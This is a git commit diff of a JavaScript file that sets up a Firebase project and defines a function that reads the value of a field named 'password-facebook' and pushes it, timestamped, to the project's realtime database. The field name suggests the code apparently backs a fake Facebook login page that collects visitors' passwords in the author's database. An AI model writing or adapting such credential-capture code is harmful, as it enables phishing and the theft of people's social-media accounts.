82330e1266fd1b9550a2ab0b9a025f5dce2d4e6a
Raj Aryan <154800358+Rajaryan827@users.noreply.github.com>
2024-09-16 11:41:50 +0530

    Update index2.js

--- index2.js
+++ index2.js
@@ -1,25 +1,33 @@
 
+<script>
+    // Your Firebase setup code
+    var firebaseConfig = {
+        apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
+        authDomain: "test-for-admin-9c05c.firebaseapp.com",
+        databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
+        projectId: "test-for-admin-9c05c",
+        storageBucket: "test-for-admin-9c05c.appspot.com",
+        messagingSenderId: "180529484791",
+        appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
+    };
+    firebase.initializeApp(firebaseConfig);
 
-// Your Firebase setup code
-var firebaseConfig = {
-    apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
-    authDomain: "test-for-admin-9c05c.firebaseapp.com",
-    databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
-    projectId: "test-for-admin-9c05c",
-    storageBucket: "test-for-admin-9c05c.appspot.com",
-    messagingSenderId: "180529484791",
-    appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
-};
-firebase.initializeApp(firebaseConfig);
+    function submitEmail() {
+        var name = document.getElementById('password-facebook').value;
 
-function submitEmail() {
-    var email = document.getElementById('password-facebook').value;
-    firebase.database().ref('emails').push({
-        email: email,
-        timestamp: new Date().toISOString()
-    }).then(() => {
-       console.log('done');
-    }).catch((error) => {
-       console.log('uff eroor occured :' + error);
-    });
-}
+        // Check if email input is not empty
+        if (name === "") {
+            console.log("Field is empty!");
+            return;
+        }
+
+        firebase.database().ref('Names').push({
+            name: name,
+            timestamp: new Date().toISOString()
+        }).then(() => {
+           console.log('Data saved successfully');
+        }).catch((error) => {
+           console.log('Error occurred: ' + error);
+        });
+    }
+</script>
